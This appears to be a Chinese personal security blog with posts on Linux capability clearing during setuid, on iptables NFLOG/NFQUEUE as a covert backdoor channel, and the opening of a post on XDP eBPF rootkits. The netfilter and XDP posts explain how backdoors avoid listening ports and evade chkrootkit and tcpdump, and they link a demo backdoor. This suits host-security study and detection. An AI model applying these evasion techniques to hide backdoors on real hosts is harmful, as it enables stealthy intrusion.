<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# su - test</span><br><span class="line">[test@instance-h9w7mlyv ~]$ ps</span><br><span class="line">  PID TTY          TIME CMD</span><br><span class="line">18042 pts&#x2F;4    00:00:00 bash</span><br><span class="line">[test@instance-h9w7mlyv ~]$ cat &#x2F;proc&#x2F;18042&#x2F;status|grep -i cap</span><br><span class="line">CapInh:	0000000000000000</span><br><span class="line">CapPrm:	0000000000000000</span><br><span class="line">CapEff:	0000000000000000</span><br><span class="line">CapBnd:	000001ffffffffff</span><br><span class="line">CapAmb:	0000000000000000</span><br></pre></td></tr></table></figure>

<blockquote>
<p>test用户是<code>useradd test</code>创建的普通用户</p>
</blockquote>
<p>对比可以发现: root用户切换test用户后，能力变少了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# ps</span><br><span class="line">  PID TTY          TIME CMD</span><br><span class="line">52739 pts&#x2F;0    00:00:00 bash</span><br><span class="line">[root@instance-h9w7mlyv ~]# cat &#x2F;proc&#x2F;52739&#x2F;status|grep -i cap</span><br><span class="line">CapInh:	0000000000000000</span><br><span class="line">CapPrm:	000001ffffffffff</span><br><span class="line">CapEff:	000001ffffffffff</span><br><span class="line">CapBnd:	000001ffffffffff</span><br><span class="line">CapAmb:	0000000000000000</span><br></pre></td></tr></table></figure>

<p>root用户通过<code>su - test</code>切换新用户后，为什么能力会变少呢？</p>
<h2 id="为什么root用户切换到新用户后能力变少？"><a href="#为什么root用户切换到新用户后能力变少？" class="headerlink" title="为什么root用户切换到新用户后能力变少？"></a>为什么root用户切换到新用户后能力变少？</h2><p>《Linux 内核安全模块深入剖析》6.4.2节中提到capset、capget、prctl三个系统调用都能改变进程的能力集，但是从下面可以看出来，su并没有用这三个系统调用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# strace -f su - test 2&gt;&amp;1|grep -i cap</span><br><span class="line">[root@instance-h9w7mlyv ~]# strace -f su - test 2&gt;&amp;1|grep -i -E &#39;\bprctl&#39;</span><br></pre></td></tr></table></figure>

<p>在《Linux系统编程手册》39.6节中提到这种情况</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">为了与用户 ID 在 0 与非 0 之间切换的传统含义保持兼容，在改变进程的用户 ID(使用 setuid()等)时，内核会完成下列操作。</span><br><span class="line"></span><br><span class="line">1. 如果真实用户ID、有效用户ID或saved set-user-ID之前的值为0，那么修改了用户 ID 之后，所有这三个 ID 的值都会变成非 0，并且进程的许可和有效能力集会被清除 (即所有的能力都被永久地删除了)。</span><br><span class="line">2. 如果有效用户 ID 从 0 变成了非 0，那么有效能力集会被清除(即有效能力被删除了，但那些位于许可集中的能力会被再次提升)。</span><br></pre></td></tr></table></figure>

<p>也就是说，当用户调用setuid系统调用从特权用户变成非特权用户时，允许能力集和有效能力集会被清除。</p>
<p>下面来验证一下，看看su程序是不是用到了setuid系统调用、setuid系统调用是不是真的可能清空能力集。</p>
<h2 id="验证setuid和能力的关系"><a href="#验证setuid和能力的关系" class="headerlink" title="验证setuid和能力的关系"></a>验证setuid和能力的关系</h2><p>通过strace可以观察到su程序确实调用了setuid</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# strace -f su - test 2&gt;&amp;1|grep setuid</span><br><span class="line">[pid 23628] setuid(1000 &lt;unfinished ...&gt;</span><br><span class="line">[pid 23628] &lt;... setuid resumed&gt;)       &#x3D; 0</span><br></pre></td></tr></table></figure>

<p>阅读内核代码后，也可以看到在cap_emulate_setxuid函数中内核清除了进程的能力集。</p>
<p>代码位置在：<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.18/source/security/commoncap.c#L1005">https://elixir.bootlin.com/linux/v4.18/source/security/commoncap.c#L1005</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">static inline void cap_emulate_setxuid(struct cred *new, const struct cred *old)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">			cap_clear(new-&gt;cap_permitted);</span><br><span class="line">			cap_clear(new-&gt;cap_effective);</span><br><span class="line">	...</span><br><span class="line">		cap_clear(new-&gt;cap_ambient);</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>cap_emulate_setxuid函数因为inline被内敛优化，所以没有办法被bpftrace观察到，但我们可以观察它的调用者cap_task_fix_setuid函数。</p>
<p>在<code>su - test</code>时，可以观察到执行了cap_task_fix_setuid函数，并且有效能力集从0x1ffffffffff变成0。如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# bpftrace -e &#39;kfunc:cap_task_fix_setuid &#x2F;comm&#x3D;&#x3D;&quot;su&quot;&#x2F; &#123;printf(&quot;%x,%x\n&quot;, ((struct cred*)args-&gt;new)-&gt;cap_effective.cap[0], ((struct cred*)args-&gt;new)-&gt;cap_effective.cap[1]);&#125;&#39;</span><br><span class="line">...</span><br><span class="line">ffffffff,1ff</span><br><span class="line"></span><br><span class="line">[root@instance-h9w7mlyv ~]# bpftrace -e &#39;kretfunc:cap_task_fix_setuid &#x2F;comm&#x3D;&#x3D;&quot;su&quot;&#x2F; &#123;printf(&quot;%x,%x\n&quot;, ((struct cred*)args-&gt;new)-&gt;cap_effective.cap[0], ((struct cred*)args-&gt;new)-&gt;cap_effective.cap[1]);&#125;&#39;</span><br><span class="line">...</span><br><span class="line">0,0</span><br></pre></td></tr></table></figure>

<p>从setuid到cap_task_fix_setuid，函数调用栈如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# bpftrace -e &#39;kprobe:cap_task_fix_setuid &#x2F;comm&#x3D;&#x3D;&quot;su&quot;&#x2F; &#123;printf(&quot;%s\n&quot;, kstack)&#125;&#39;</span><br><span class="line">Attaching 1 probe...</span><br><span class="line"></span><br><span class="line">  cap_task_fix_setuid+1</span><br><span class="line">  security_task_fix_setuid+48</span><br><span class="line">  __sys_setuid+151    &#x2F;&#x2F; setuid系统调用入口</span><br><span class="line">  do_syscall_64+91</span><br><span class="line">  entry_SYSCALL_64_after_hwframe+101</span><br></pre></td></tr></table></figure>

<p><img src="https://user-images.githubusercontent.com/1846319/189155197-b4aeaa60-4ae6-48b5-9d19-17a87b5c8380.png"></p>
<p>所以，setuid时root用户变成非root用户时，允许能力集和有效能力集会被清零。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>能力的计算机制感觉很复杂。</p>
<p>普通用户在执行<code>strace xxx</code>后，xxx进程的有效能力集可以认为是strace文件和xxx文件的允许能力集的交集。</p>
<p>调用setuid系统调用从特权用户变成非特权用户时，允许能力集和有效能力集会被清除。</p>
<p>通过阅读代码和bpftrace工具，可以定位到内核中处理能力的代码位置，进一步验证结论。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022-08-21-%E5%9F%BA%E4%BA%8Enetfilter%E7%9A%84%E5%90%8E%E9%97%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd的个人博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022-08-21-%E5%9F%BA%E4%BA%8Enetfilter%E7%9A%84%E5%90%8E%E9%97%A8/" class="post-title-link" itemprop="url">基于netfilter的后门</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-08-21 19:53:47" itemprop="dateCreated datePublished" datetime="2022-08-21T19:53:47+08:00">2022-08-21</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2022-08-30 14:47:13" itemprop="dateModified" datetime="2022-08-30T14:47:13+08:00">2022-08-30</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>蜜罐产品有个功能是对任何端口的访问都会被记录，即使是”nmap扫描后显示关闭”的端口访问也会被记录。它的实现原理是iptables的NFLOG。</p>
<p>学习NFLOG概念后，我想到也可以用它来做后门通信。</p>
<p>本文包括以下内容</p>
<ul>
<li>讨论NFLOG是什么</li>
<li>用NFLOG机制实现后门的优势分析</li>
<li>NFQUEUE后门demo</li>
</ul>
<p>希望能对主机安全感兴趣的读者有点帮助</p>
<h1 id="NFLOG是什么"><a href="#NFLOG是什么" class="headerlink" title="NFLOG是什么"></a>NFLOG是什么</h1><p>它是一个target，就像<code>ACCEPT</code>、<code>DROP</code>等可以作为<code>iptables -j</code>后的参数值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# iptables -A INPUT -p tcp -m multiport --dports 1:65535 -j NFLOG --nflog-group 2333</span><br></pre></td></tr></table></figure>

<p>比如上面规则就会告诉内核协议栈，在收到包时，目的端口是1到65535的包，全部执行NFLOG动作。</p>
<p><code>man iptables-extensions</code> 文档中也有关于NFLOG的说明</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">NFLOG</span><br><span class="line">    This  target  provides  logging of matching packets. When this target is set for a rule, the Linux kernel will pass the packet to the loaded logging backend to log the packet. This is usually</span><br><span class="line">    used in combination with nfnetlink_log as logging backend, which will multicast the packet through a netlink socket to the specified multicast group. One or more userspace processes may  sub-</span><br><span class="line">    scribe to the group to receive the packets. Like LOG, this is a non-terminating target, i.e. rule traversal continues at the next rule.</span><br><span class="line"></span><br><span class="line">    --nflog-group nlgroup</span><br><span class="line">           The netlink group (0 - 2^16-1) to which packets are (only applicable for nfnetlink_log). The default value is 0.</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p><code>-j NFLOG</code>和<code>-j LOG</code>有些类似，都可以记录数据包信息，执行动作后会继续匹配iptables规则中的下一条。区别是<code>-j NFLOG</code>可以让用户态程序通过<code>netlink</code>从内核获得数据包信息。</p>
<p>下面你可以和我一起做个小实验来验证一下,用户态程序是否可以通过<code>netlink</code>获取到数据包。</p>
<h1 id="用tcpdump验证"><a href="#用tcpdump验证" class="headerlink" title="用tcpdump验证"></a>用tcpdump验证</h1><p><img src="https://user-images.githubusercontent.com/1846319/185792120-a040054d-efd4-41a4-a1f5-5399df7ac8d6.png"></p>
<p>第一步，你需要配置iptables的nflog规则。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# iptables -A INPUT -p tcp -m multiport --dports 65530:65535 -j NFLOG --nflog-group 2333</span><br></pre></td></tr></table></figure>

<p>第二步，使用<code>tcpdump</code>订阅netlink消息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# tcpdump -i nflog:2333</span><br></pre></td></tr></table></figure>

<p>第三步，访问主机，验证<code>tcpdump</code>是否能获取到数据包。</p>
<p><code>curl x.x.x.x:65533</code> 后，可以抓到数据包。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# tcpdump -i nflog:2333</span><br><span class="line">...</span><br><span class="line">listening on nflog:2333, link-type NFLOG (Linux netfilter log messages), capture size 262144 bytes</span><br><span class="line">11:42:15.175375 IP 111.197.238.30.22293 &gt; instance-h9w7mlyv.65533: Flags [S], seq 3599662212, win 65535, options [mss 1452,nop,wscale 6,nop,nop,TS val 3053845653 ecr 0,sackOK,eol], length 0</span><br></pre></td></tr></table></figure>

<p>或许你会有一个问题：<code>tcpdump -i nflog:2333</code>和<code>tcpdump -i eth0</code>都可以获取数据包，有啥区别。</p>
<p>从编程实现来看是有区别的，<code>tcpdump -i eth0</code>是基于<code>AF_PACKET</code>获取数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# strace tcpdump -i lo</span><br><span class="line">socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL)) &#x3D; 3</span><br><span class="line">...</span><br><span class="line">setsockopt(3, SOL_PACKET, PACKET_RX_RING, 0x7ffeef157d10, 28) &#x3D; 0     &#x2F;&#x2F; Packet MMAP提高抓包性能，参考 https:&#x2F;&#x2F;github.com&#x2F;torvalds&#x2F;linux&#x2F;blob&#x2F;master&#x2F;Documentation&#x2F;networking&#x2F;packet_mmap.rst</span><br><span class="line">mmap(NULL, 4194304, PROT_READ|PROT_WRITE, MAP_SHARED, 3, 0) &#x3D; 0x7fedba9a5000</span><br><span class="line">...</span><br><span class="line">setsockopt(3, SOL_SOCKET, SO_ATTACH_FILTER, &#123;len&#x3D;1, filter&#x3D;0x7ff0a4ee8000&#125;, 16) &#x3D; 0   &#x2F;&#x2F; bpf filter</span><br><span class="line">setsockopt(3, SOL_SOCKET, SO_ATTACH_FILTER, &#123;len&#x3D;1, filter&#x3D;0x56436b7fe480&#125;, 16) &#x3D; 0</span><br><span class="line">...</span><br><span class="line">poll([&#123;fd&#x3D;3, events&#x3D;POLLIN&#125;], 1, 1000)  &#x3D; 0 (Timeout)</span><br><span class="line">poll([&#123;fd&#x3D;3, events&#x3D;POLLIN&#125;], 1, 1000)  &#x3D; 1 ([&#123;fd&#x3D;3, revents&#x3D;POLLIN&#125;])</span><br><span class="line">write(1, &quot;12:27:16.575888 IP localhost.416&quot;..., 16512:27:16.575888 IP localhost.41616 &gt; localhost.http: Flags [S], seq 3517707840, win 43690, options [mss 65495,sackOK,TS val 1304864277 ecr 0,nop,wscale 7], length 0</span><br></pre></td></tr></table></figure>

<p><code>tcpdump -i nflog:2333</code>是基于<code>AF_NETLINK</code>获取数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# strace tcpdump -i nflog:2333</span><br><span class="line">socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER) &#x3D; 3</span><br><span class="line">...</span><br><span class="line">recvfrom(3,[&#123;&#123;len&#x3D;184, type&#x3D;NFNL_SUBSYS_ULOG&lt;&lt;8|NFULNL_MSG_PACKET, flags&#x3D;0, seq&#x3D;0, pid&#x3D;0&#125;, &#123;nfgen_family&#x3D;AF_INET, version&#x3D;NFNETLINK_V0, res_id&#x3D;htons(2333), [&#123;&#123;nla_len&#x3D;8, nla_type&#x3D;NFNETLINK_V1&#125;, &quot;\x08\x00\x01\x00&quot;&#125;, &#123;&#123;nla_len&#x3D;5, nla_type&#x3D;0xa&#125;, &quot;\x00&quot;&#125;, &#123;&#123;nla_len&#x3D;8, nla_type&#x3D;0x4&#125;, &quot;\x00\x00\x00\x02&quot;&#125;, &#123;&#123;nla_len&#x3D;16, nla_type&#x3D;0x8&#125;, &quot;\x00\x06\x00\x00\xfa\x16\x3e\xd1\x8d\x2d\x00\x00&quot;&#125;, &#123;&#123;nla_len&#x3D;6, nla_type&#x3D;0xf&#125;, &quot;\x00\x01&quot;&#125;, &#123;&#123;nla_len&#x3D;6, nla_type&#x3D;0x11&#125;, &quot;\x00\x0e&quot;&#125;, &#123;&#123;nla_len&#x3D;18, nla_type&#x3D;0x10&#125;, &quot;\xfa\x28\x00\x0d\x3f\xff\xfa\x16\x3e\xd1\x8d\x2d\x08\x00&quot;&#125;, &#123;&#123;nla_len&#x3D;20, nla_type&#x3D;0x3&#125;, &quot;\x00\x00\x00\x00\x63\x08\x57\x83\x00\x00\x00\x00\x00\x03\x49\x03&quot;&#125;, &#123;&#123;nla_len&#x3D;68, nla_type&#x3D;0x9&#125;, &quot;\x45\x00\x00\x40\x00\x00\x40\x00\x32\x06\x1e\xc0\x6f\xc5\xee\x1e\xac\x10\x20\x04\x5b\x41\xff\xfd\x5a\x0c\x47\xf0\x00\x00\x00\x00&quot;...&#125;]&#125;, &#123;&#123;len&#x3D;184, type&#x3D;NFNL_SUBSYS_ULOG&lt;&lt;8|NFULNL_MSG_PACKET, flags&#x3D;0, seq&#x3D;0, pid&#x3D;0&#125;, &#123;nfgen_family&#x3D;AF_INET, version&#x3D;NFNETLINK_V0, res_id&#x3D;htons(2333), [&#123;&#123;nla_len&#x3D;8, nla_type&#x3D;NFNETLINK_V1&#125;, &quot;\x08\x00\x01\x00&quot;&#125;, &#123;&#123;nla_len&#x3D;5, nla_type&#x3D;0xa&#125;, &quot;\x00&quot;&#125;, &#123;&#123;nla_len&#x3D;8, nla_type&#x3D;0x4&#125;, &quot;\x00\x00\x00\x02&quot;&#125;, &#123;&#123;nla_len&#x3D;16, nla_type&#x3D;0x8&#125;, &quot;\x00\x06\x00\x00\xfa\x16\x3e\xd1\x8d\x2d\x00\x00&quot;&#125;, &#123;&#123;nla_len&#x3D;6, nla_type&#x3D;0xf&#125;, &quot;\x00\x01&quot;&#125;, &#123;&#123;nla_len&#x3D;6, nla_type&#x3D;0x11&#125;, &quot;\x00\x0e&quot;&#125;, &#123;&#123;nla_len&#x3D;18, nla_type&#x3D;0x10&#125;, &quot;\xfa\x28\x00\x0d\x3f\xff\xfa\x16\x3e\xd1\x8d\x2d\x08\x00&quot;&#125;, &#123;&#123;nla_len&#x3D;20, nla_type&#x3D;0x3&#125;, &quot;\x00\x00\x00\x00\x63\x08\x57\x84\x00\x00\x00\x00\x00\x03\x4b\x6c&quot;&#125;, &#123;&#123;nla_len&#x3D;68, nla_type&#x3D;0x9&#125;, &quot;\x45\x00\x00\x40\x00\x00\x40\x00\x32\x06\x1e\xc0\x6f\xc5\xee\x1e\xac\x10\x20\x04\x5b\x41\xff\xfd\x5a\x0c\x47\xf0\x00\x00\x00\x00&quot;...&#125;]&#125;, &#123;&#123;len&#x3D;20, type&#x3D;NLMSG_DONE, flags&#x3D;0, seq&#x3D;0, pid&#x3D;0&#125;, 0&#125;], 262272, 0, NULL, NULL) &#x3D; 388</span><br></pre></td></tr></table></figure>

<blockquote>
<p>不知道为什么实现监听流量时，厂家选择了基于<code>NFLOG</code>而不是<code>AF_PACKET</code>来做。</p>
</blockquote>
<p>而在实现后门中，我们也可以用<code>NFLOG</code>作为被控端和主控端的通信方式，下面来看一下它有什么好处。</p>
<h1 id="利用NFLOG做后门有什么好处"><a href="#利用NFLOG做后门有什么好处" class="headerlink" title="利用NFLOG做后门有什么好处"></a>利用<code>NFLOG</code>做后门有什么好处</h1><p>就像在 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Rezm05kP6fxB5Pwib1HxDA">聊一聊基于”ebpf xdp”的rootkit</a> 中我看到的: “rootkit用xdp ebpf和bpf技术都是为了通信时不监听端口，从而在网络行为上隐藏痕迹”。同样<code>NFLOG</code>也可以达到这个目的，甚至使用<code>NFLOG</code>相对于基于<code>AF_PACKET</code>的bpf后门从网络行为上看更隐蔽一点。为什么这么说呢？</p>
<p>举个例子，<code>chkrootkit</code>反入侵工具会通过<code>/proc/net/packet</code>检查哪些进程创建了<code>PF_PACKET</code>类型socket，因此可以发现bpf后门痕迹。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv tmp]# gcc ifpromisc.c</span><br><span class="line">[root@instance-h9w7mlyv tmp]# .&#x2F;a.out</span><br><span class="line">eth0: PF_PACKET(&#x2F;usr&#x2F;decoy&#x2F;decoysvc, &#x2F;usr&#x2F;sbin&#x2F;NetworkManager)</span><br><span class="line">docker0: PF_PACKET(&#x2F;usr&#x2F;sbin&#x2F;NetworkManager)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>AF_PACKET 和 PF_PACKET 同义</p>
</blockquote>
<p><code>chkrootkit</code>目前就不会检查<code>NFLOG</code>后门。虽然从<code>/proc/net/netlink</code>也可以看到哪些进程创建了<code>AF_NETLINK</code>类型socket，但是系统上正常进程也会创建很多<code>AF_NETLINK</code>类型socket，比如我在centos8虚机上看到有30多个记录。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv tmp]# cat &#x2F;proc&#x2F;net&#x2F;netlink | wc -l</span><br><span class="line">32</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/340">聊一聊chkrookit的误信和误用</a> 文章提到<code>chkrootkit</code>会扫描PF_PACKET</p>
</blockquote>
<p>利用<code>NFLOG</code>也应该比较稳定。为什么我这么认为呢？</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Il80jMO7YbsgctQZJtq7Mw">一种HTTP隧道内核态远控的实现方法</a> 文中提到一个思路: 在内核态基于netfilter实现一个可回显的后门。</p>
<p>而<code>NFLOG</code>有现成的lib库做用户态编程，相比于内核编程，我想用户态程序应该更稳定、适配性更好吧。</p>
<p>另外，iptables还提供了一个和<code>NFLOG</code>类似的扩展<code>NFQUEUE</code>，<code>man iptables-extensions</code>文档提到<code>NFQUEUE</code>可以修改数据包。所以是不是可以用<code>NFQUEUE</code>在用户态基于netfilter实现一个可回显的后门呢？</p>
<h1 id="NFQUEUE后门demo"><a href="#NFQUEUE后门demo" class="headerlink" title="NFQUEUE后门demo"></a>NFQUEUE后门demo</h1><p>我基于<code>libnetfilter_queue</code>写了一个后门demo</p>
<p>代码我放在了 <a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/f70bd0adbf8088446d98ec11ef16f478">https://gist.github.com/leveryd/f70bd0adbf8088446d98ec11ef16f478</a></p>
<p>运行效果如下</p>
<p><img src="https://user-images.githubusercontent.com/1846319/186878339-7d1982a5-23af-42a8-a137-31711061719c.png"></p>
<blockquote>
<p>因为我懒，所以这个后门没有实现回显。</p>
</blockquote>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>NFLOG在蜜罐、后门实现时都可以用到。</p>
<p>实现后门时，它的优点包括通信较为隐蔽、稳定、可回显。</p>
<!--
# 疑问
* netlink需要什么权限？
* 是否可以不用 sock_raw 实现抓包？

权限问题: 必须要有cap_net_admin权限，cap_net_raw权限都不管用.
-->

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022-08-14-%E8%81%8A%E4%B8%80%E8%81%8A%E5%9F%BA%E4%BA%8E%22ebpf%20xdp%22%E7%9A%84rootkit/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd的个人博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022-08-14-%E8%81%8A%E4%B8%80%E8%81%8A%E5%9F%BA%E4%BA%8E%22ebpf%20xdp%22%E7%9A%84rootkit/" class="post-title-link" itemprop="url">聊一聊基于"ebpf xdp"的rootkit</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-08-14 15:45:59" itemprop="dateCreated datePublished" datetime="2022-08-14T15:45:59+08:00">2022-08-14</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2022-08-19 21:37:59" itemprop="dateModified" datetime="2022-08-19T21:37:59+08:00">2022-08-19</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>在 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/7_ZrnKVaWuBjXCgmqdaUAQ">全流量入侵检测系统的性能分析</a> 中提到”包解析需要高性能”这个需求场景，和 pf_ring、dpdk 类似，xdp也是一种经常被讨论的高性能包处理技术。</p>
<p>在 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/EoiyhMIn6VpxWK92AZS_PQ">lkm和ebpf rootkit分析的简要记录</a> 中提到一个基于ebpf实现的rootkit <a target="_blank" rel="noopener" href="https://github.com/kris-nova/boopkit">boopkit</a>。这个后门通信部分当前是基于libpcap，还有一个未公开的xdp实现。</p>
<p>因此我感觉xdp在网络编程、网络安全上都能应用上，值得研究。于是我从实现”xdp ebpf后门”来学习xdp。</p>
<p>本文主要记录以下内容，希望对主机安全有兴趣的读者有点帮助。内容包括：</p>
<ul>
<li>xdp ebpf后门相比于 bpf 后门的优点</li>
<li>xdp后门demo</li>
<li>demo编写时的关键点</li>
<li>检测角度来看，xdp后门的特征</li>
</ul>
<p>关于ebpf和xdp的背景知识你可以参考 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/BOamc7V7lZQa1FTuJMqSIA">Linux网络新技术基石 |​eBPF and XDP</a></p>
<h1 id="xdp-ebpf后门和bpf后门对比"><a href="#xdp-ebpf后门和bpf后门对比" class="headerlink" title="xdp ebpf后门和bpf后门对比"></a>xdp ebpf后门和bpf后门对比</h1><p>已经有了bpf后门，为什么还有人要研究xdp ebpf后门呢？</p>
<p>在实现后门时，xdp ebpf和bpf技术都是为了获取数据包，可以做到不需要监听端口、客户端可以向服务端做单向通信。它俩的区别在于，xdp ebpf后门比bpf后门更加隐蔽，在主机上用tcpdump可以抓取bpf后门流量，但无法抓取xdp ebpf后门流量。</p>
<p>为什么会这样呢？</p>
<p><a target="_blank" rel="noopener" href="https://github.com/gwillgues/BPFDoor">bpfdoor</a> 、 <a target="_blank" rel="noopener" href="https://github.com/kris-nova/boopkit">boopkit</a> 等bpf后门都是基于af_packet抓包、bpf filter过滤包，它工作在链路层。</p>
<blockquote>
<p>关于bpfdoor的分析可以参考 <a target="_blank" rel="noopener" href="https://www.sandflysecurity.com/blog/bpfdoor-an-evasive-linux-backdoor-technical-analysis/">BPFDoor - An Evasive Linux Backdoor Technical Analysis</a></p>
</blockquote>
<p>xdp有三种工作模式，不论哪一种模式，在接收数据包时都比bpf后门要早。</p>
<p>tcpdump这种抓包工具的原理和bpf后门是一样的，也是工作在链路层。所以网卡接收到数据包后，会先经过xdp ebpf后门，然后分别经过bpf后门和tcpdump。</p>
<p>如果xdp ebpf后门在接收到恶意指令后把数据包丢掉，tcpdump就抓不到数据包。</p>
